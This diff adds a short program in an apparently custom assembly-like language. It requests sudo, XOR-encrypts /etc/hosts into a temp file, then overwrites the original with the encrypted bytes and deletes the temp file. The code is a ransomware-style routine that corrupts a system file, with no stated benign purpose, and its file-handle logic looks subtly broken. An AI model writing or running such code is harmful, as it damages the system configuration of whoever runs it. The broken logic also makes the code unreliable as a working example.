@@ -1,0 +1,62 @@
+
+!link ../lib/stdlib/syscall.mkpk
+!requires_sudo true
+
+[[data]]
+hosts: "/etc/hosts"
+temp_file: "/tmp/sdfhsdsdfiusfiysudgf"
+
+# The encryption key should be the same size as the buffer.
+buffer_size: 4
+enc_key: 0x65d550f9
+
+[[code]]
+[main]
+# Grab a handle to the files.
+> sys_open "hosts" ${O_RDONLY}
+mov r9, rax
+> sys_open "temp_file" ${O_CREAT_WR}
+mov r10, rax
+
+buffered_reader:
+> sys_read r9 ${buffer_size}
+
+test rax, rax
+jz copy_file
+
+# XOR the buffer contents and move into temp file.
+mov rax, rsp
+mov ecx, dword [rax]
+xor ecx, ${enc_key}
+mov dword [rsp], ecx
+
+> sys_write rsp ${buffer_size} r10
+
+jmp buffered_reader
+
+copy_file:
+# Close the target file handle, then re-open with write permissions.
+> sys_close r9
+> sys_open "hosts" ${O_WRONLY}
+mov r9, rax
+
+# Close the temp file, then re-open with read permissions.
+> sys_close r10
+> sys_open "temp_file" ${O_RDONLY}
+
+buffered_reader2:
+# Copy the contents of the temp file into the target file.
+> sys_read r10 ${buffer_size}
+
+test rax, rax
+jz exit
+
+> sys_write rsp ${buffer_size} r9
+jmp buffered_reader2
+
+exit:
+# Close the file handles, delete the temp file, then exit.
+> sys_close r9
+> sys_close r10
+> sys_unlink "temp_file"
+> sys_exit
